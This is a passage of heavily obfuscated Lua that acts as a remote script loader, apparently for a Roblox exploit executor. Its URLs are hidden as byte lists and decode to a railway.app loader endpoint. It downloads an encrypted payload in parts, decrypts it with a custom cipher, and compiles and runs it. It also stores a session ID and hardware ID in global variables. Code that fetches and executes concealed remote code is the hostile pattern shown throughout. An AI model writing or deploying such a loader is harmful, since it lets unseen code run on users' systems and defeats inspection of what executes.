  local KB={117,72,136,193,54,74,124,109,134,251,78,151,31,137,235,69,142,141,82,121,120,97,127,37,150,58,107,110,206,71,48,170}
  local out,n={},0
  for i=1,#S do
    local c=string.byte(S,i)
    sb=(MB*sb+AB)%4294967296
    local ksb=(sb%256+KB[((i-1)%32)+1]+((i*113+LB)%256)+pb)%256
    pb=c
    local mid=(_41804c[c]-ksb)%256
    sa=(MA*sa+AA)%4294967296
    local ksa=(sa%256+KA[((i-1)%32)+1]+((i*113+LA)%256)+pa)%256
    pa=mid
    local p=(_c43b6c[mid]-ksa)%256
    n=n+1
    out[n]=_8467a6[p]
  end
  return table.concat(out)
end
local _9ca570
do
  local np = _6c7179
  local base = (string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,97,112,105,47,108,111,97,100,101,114,47,97,55,54,99,57,57,97,55,55,54,98,100,52,56,46,108,117,97,63,112,97,99)..string.char(107,61,49,38,112,97,114,116,61)) .. "@@PARTNUM@@" .. string.char(38,100,116,111,107,61) .. _c79105
  local single = (string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,97,112,105,47,108,111,97,100,101,114,47,97,55,54,99,57,57,97,55,55,54,98,100,52,56,46,108,117,97,63,115,105,110)..string.char(103,108,101,61,49,38,100,116,111,107,61)) .. _c79105
  local function take(res, err)
    if type(res) ~= "string" or #res < 9 then return nil, tostring(err or res or "empty") end
    local hx = string.sub(res, 1, 8)
    local okNum = true
    pcall(function() if tonumber(hx, 16) == nil then okNum = false end end)
    if not okNum then return nil, "message" end
    local want = _3b894f(hx)
    local body = string.sub(res, 9)
    if (_9697a2(body) % 4294967296) ~= want then return nil, "checksum" end
    return body, nil
  end
  local function fetchAll()
    if _22ff37 == nil then return nil, string.char(110,111,32,108,111,97,100,101,114) end
    local res, err = _78e0d0(single)
    local body, why = take(res, err)
    if body == nil then return nil, why end
    if body ~= "" and (_9697a2(body) % 4294967296) ~= _3b894f(_b84da6) then
      return nil, string.char(112,97,121,108,111,97,100,32,104,97,115,104)
    end
    return { body }
  end
  local got = {}
  local missing = nil
  for i = 1, np do
    local body, lastErr = nil, nil
    for attempt = 1, 6 do
      local res, err = _78e0d0(string.gsub(base, "@@PARTNUM@@", tostring(i)))
      if type(res) == "string" and #res == 0 then
        body = ""
        break
      end
      body, lastErr = take(res, err)
      if body ~= nil then break end
      if lastErr == "message" then _7ad16d(string.char(68,101,108,105,118,101,114,121,32,114,101,106,101,99,116,101,100)) return end
      nap(0.25 * attempt)
    end
    if body == nil then
      missing = tostring(i)
      break
    end
    got[i] = body
  end
  if missing == nil then
    _9ca570 = got
  else
    local all, why = fetchAll()
    if all == nil then
      _7ad16d(string.char(68,111,119,110,108,111,97,100,32,102,97,105,108,101,100,32,112,97,114,116,32) .. missing)
      return
    end
    _9ca570 = all
  end
end
local ok, plain, why = (function()
  local sh = _9ca570
  if type(sh) ~= "table" then return false, nil, string.char(110,111,32,112,97,121,108,111,97,100) end
  local parts = {}
  for i = 1, #sh do parts[#parts+1] = sh[i] end
  local joined = table.concat(parts)
  parts = nil
  sh = nil
  _9ca570 = nil
  if #joined == 0 then return false, nil, string.char(101,109,112,116,121,32,112,97,121,108,111,97,100) end
  local expect = _3b894f(_b84da6)
  if expect ~= nil and (_9697a2(joined) % 4294967296) ~= expect then
    return false, nil, string.char(112,97,121,108,111,97,100,32,99,104,101,99,107,115,117,109,32,109,105,115,109,97,116,99,104)
  end
  local raw = _ebb722(joined)
  joined = nil
  local out = (_ba9e40)(raw)
  raw = nil
  if type(out) ~= "string" or #out == 0 then return false, nil, string.char(100,101,99,114,121,112,116,32,102,97,105,108,101,100) end
  local ph = _3b894f(_d64de6)
  if ph ~= nil and (_9697a2(out) % 4294967296) ~= ph then
    return false, nil, string.char(105,110,116,101,103,114,105,116,121,32,109,105,115,109,97,116,99,104)
  end
  return true, out, nil
end)()
if not ok then
  _7ad16d(string.char(80,97,121,108,111,97,100,32,101,114,114,111,114,58,32) .. tostring(why))
  return
end
do
  local sess = {ok = true, sid = string.char(97,55,54,99,57,57,97,55,55,54,98,100,52,56), scriptId = string.char(97,55,54,99,57,57,97,55,55,54,98,100,52,56), t = 0}
  pcall(function() if type(os) == "table" and type(os.clock) == "function" then sess.t = os.clock() end end)
  local function setg(name, value)
    pcall(function() if type(getgenv) == "function" then local g = getgenv() if type(g) == "table" then g[name] = value end end end)
    pcall(function() if type(_G) == "table" then _G[name] = value end end)
  end
  setg(string.char(95,75,77,95,65,85,84,72), sess)
  setg(string.char(95,75,77,95,83,73,68), sess.sid)
  setg(string.char(95,75,77,95,66,65,83,69), string.char(104,116,116,112,115,58,47,47,107,105,110,103,109,111,114,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112))
  setg(string.char(95,75,77,95,72,87,73,68), hwid)
end
local fn, cerr = _1c1d94[1](_22ff37, plain)
plain = nil
if type(fn) ~= "function" then
  warn(string.char(91,75,105,110,103,109,111,114,93,32,99,111,109,112,105,108,101,58,32) .. tostring(cerr))
  _7ad16d(string.char(83,99,114,105,112,116,32,99,111,109,112,105,108,101,32,101,114,114,111,114))
  return
end
local rok, runErr = _1c1d94[2](fn, false)
fn = nil
pcall(function() if collectgarbage then collectgarbage("collect") end end)
if not rok then warn(string.char(91,75,105,110,103,109,111,114,93,32,114,117,110,116,105,109,101,58,32) .. tostring(runErr)) end
